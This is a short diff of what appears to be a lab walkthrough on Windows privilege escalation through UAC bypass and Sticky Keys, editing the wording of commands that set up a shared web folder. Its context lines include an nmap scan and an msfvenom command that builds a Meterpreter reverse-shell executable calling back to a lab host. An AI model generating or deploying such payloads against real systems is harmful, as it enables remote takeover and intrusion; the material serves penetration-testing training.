@@ -258,9 +258,9 @@ nmap -A -sC -sV [IP]
 ```
 **Task : Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys**
 ```
-Run mkdir /var/www/html/share command to create a shared folder
-Run chmod -R 755 /var/www/html/share command
-Run chown -R www-data:www-data /var/www/html/share command
+mkdir /var/www/html/share 
+chmod -R 755 /var/www/html/share 
+chown -R www-data:www-data /var/www/html/share 
 
 
  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
